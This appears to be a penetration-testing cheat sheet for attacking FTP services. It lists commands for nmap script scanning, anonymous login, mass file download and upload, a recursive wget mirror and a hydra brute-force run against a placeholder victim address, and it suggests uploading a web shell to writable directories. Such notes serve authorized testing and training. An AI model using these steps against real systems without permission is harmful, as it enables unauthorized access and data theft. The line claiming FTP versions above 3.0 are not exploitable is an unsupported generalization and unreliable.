- `Try Anonymous Login` 
- `If valid FTP credentials are found, try uploading a web shell to writable directories`
- `look for downloadable files that can provide initial access`
- `Note: FTP versions above 3.0 are typically not exploitable`

### <span style="color:#50FA7B">Scan FTP</span>
```bash
nmap -p 21 --script=ftp-* $VICTIM_IP
```

### <span style="color:#50FA7B">Anonymous Login</span>
```bash
ftp $VICTIM_IP
# User: anonymous | Pass: anonymous
# If 'ls' fails → type: passive
```

### <span style="color:#50FA7B">File Operations</span>
```bash
mget *           # Download all files
get <file>       # Download single file
put <file>       # Upload a file
binary           # Set binary mode (for shells)
```

### <span style="color:#50FA7B">Analyze Downloads</span>
```bash
exiftool -u -a <file>
```

### <span style="color:#50FA7B">Download everything recursively</span>
```bash
wget -m --no-passive ftp://anonymous:anonymous@$VICTIM_IP
```

### <span style="color:#50FA7B">Brute Force</span>
```bash
hydra -L users.list -P passwords.list -s 2121 -f -vV $VICTIM_IP ftp
```